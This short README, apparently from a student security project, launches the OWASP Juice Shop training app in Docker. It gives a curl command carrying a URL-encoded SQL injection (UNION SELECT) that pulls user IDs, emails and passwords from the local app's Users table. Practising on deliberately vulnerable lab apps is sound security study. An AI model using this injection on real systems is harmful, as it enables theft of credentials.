# DACN
#Lệnh chạy docker

docker run --rm -p 3000:3000 bkimminich/juice-shop

http://localhost:3000


curl "http://localhost:3000/rest/products/search?q=a%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20Users--"